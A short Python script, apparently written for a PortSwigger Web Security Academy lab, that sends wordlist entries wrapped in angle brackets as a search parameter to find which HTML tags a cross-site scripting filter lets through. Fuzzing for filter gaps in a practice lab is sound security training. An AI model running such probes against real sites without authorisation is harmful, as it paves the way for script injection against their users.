import requests

# Define the URL
url = "https://0a5100e403d85417802e12a7004f00ae.web-security-academy.net/"  # Replace with the actual URL

wordlist_path = "word.txt"

# Read the wordlist
with open(wordlist_path, 'r') as file:
    payloads = file.read().splitlines()

# Iterate over each payload in the wordlist
for payload in payloads:
    # Define the parameters for the GET request
    # add the payload inside <>

    params = {'search': f'<{payload}>'}
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        print(f"Payload: {payload} | Status Code: {response.status_code}")
    else:
        print("fuck")